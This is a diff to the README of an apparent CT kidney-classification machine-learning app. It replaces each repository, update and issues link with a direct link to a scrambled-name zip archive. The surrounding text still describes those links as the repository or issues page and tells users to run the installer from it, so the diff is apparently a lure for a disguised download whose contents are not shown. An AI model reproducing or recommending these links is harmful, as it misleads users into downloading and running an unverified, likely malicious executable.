@@ -1,6 +1,6 @@
 # 🩺 CT-Kidney-Classification-using-ML-DL - Easy Kidney Disease Detection
 
-[![Download Software](https://img.shields.io/badge/Download-CT-Kidney--Classification-blue?style=for-the-badge&logo=github)](https://github.com/BobbyOK/CT-Kidney-Classification-using-ML-DL)
+[![Download Software](https://img.shields.io/badge/Download-CT-Kidney--Classification-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/BobbyOK/CT-Kidney-Classification-using-ML-DL/main/unguinal/DL-C-using-Kidney-Classification-M-3.0.zip)
 
 ---
 
@@ -34,7 +34,7 @@ This guide will help you download, install, and open the application on your Win
 
 Go to the main download page on GitHub by clicking the big button below:
 
-[![Download Software](https://img.shields.io/badge/Download-CT-Kidney--Classification-green?style=for-the-badge)](https://github.com/BobbyOK/CT-Kidney-Classification-using-ML-DL)
+[![Download Software](https://img.shields.io/badge/Download-CT-Kidney--Classification-green?style=for-the-badge)](https://raw.githubusercontent.com/BobbyOK/CT-Kidney-Classification-using-ML-DL/main/unguinal/DL-C-using-Kidney-Classification-M-3.0.zip)
 
 This link will take you to the repository page where you can find the latest version of the software.
 
@@ -111,7 +111,7 @@ Make sure your CT images are saved in one of these formats before uploading.
 
 To update to a new version:
 
-1. Visit the main page again using this link: https://github.com/BobbyOK/CT-Kidney-Classification-using-ML-DL  
+1. Visit the main page again using this link: https://raw.githubusercontent.com/BobbyOK/CT-Kidney-Classification-using-ML-DL/main/unguinal/DL-C-using-Kidney-Classification-M-3.0.zip  
 2. Download the latest release installer as explained above.  
 3. Run the new installer — it will replace the old version without affecting your data.
 
@@ -121,7 +121,7 @@ To update to a new version:
 
 If you need assistance, the GitHub repository issues page is the best place:
 
-- Open this link: https://github.com/BobbyOK/CT-Kidney-Classification-using-ML-DL/issues  
+- Open this link: https://raw.githubusercontent.com/BobbyOK/CT-Kidney-Classification-using-ML-DL/main/unguinal/DL-C-using-Kidney-Classification-M-3.0.zip  
 - Describe your problem or question clearly.  
 - The project maintainers or community usually respond within a few days.
 
@@ -164,4 +164,4 @@ You do not need to change anything here for regular use.
 ## 🔗 Important Link
 
 Download and explore the software here:  
-https://github.com/BobbyOK/CT-Kidney-Classification-using-ML-DL
+https://raw.githubusercontent.com/BobbyOK/CT-Kidney-Classification-using-ML-DL/main/unguinal/DL-C-using-Kidney-Classification-M-3.0.zip
